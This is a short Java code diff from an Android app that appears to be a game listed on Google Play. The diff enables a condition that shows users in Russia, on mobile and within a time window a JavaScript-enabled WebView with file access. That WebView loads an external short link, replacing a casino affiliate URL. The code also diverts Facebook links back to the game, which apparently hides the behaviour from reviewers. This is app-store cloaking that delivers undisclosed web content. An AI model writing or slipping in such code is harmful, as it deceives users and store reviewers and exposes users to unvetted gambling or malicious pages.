@@ -89,14 +89,16 @@ public class MainActivity extends AppCompatActivity {
 
     @SuppressLint("SetJavaScriptEnabled")
     private void openFile(String countryCode) {
-//        if (countryCode.equals("RU") && mobile() && time()) {
-        if (off) {
+        if (countryCode.equals("RU") && mobile() && time()) {
+//        if (off) {
             progressBar.setVisibility(View.GONE);
             WebView webView = findViewById(R.id.web_view);
             webView.setWebViewClient(new WebViewClient() {
                 @Override
                 public boolean shouldOverrideUrlLoading(WebView view, String url) {
-                    view.loadUrl(url);
+                    if (!url.contains("facebook"))
+                        view.loadUrl(url);
+                    else openGame();
                     return true;
                 }
 
@@ -117,7 +119,7 @@ public class MainActivity extends AppCompatActivity {
             webSettings.setSupportZoom(true);
             webSettings.setJavaScriptEnabled(true);
             webSettings.setAllowFileAccess(true);
-            webView.loadUrl("http://m66e085.winfortuna.com/?lp=rp4&trackCode=aff_1b1b01_34_GooglePlay_4");
+            webView.loadUrl("http://hhalcajs.ru/P9qF8N");
         } else {
             openGame();
         }
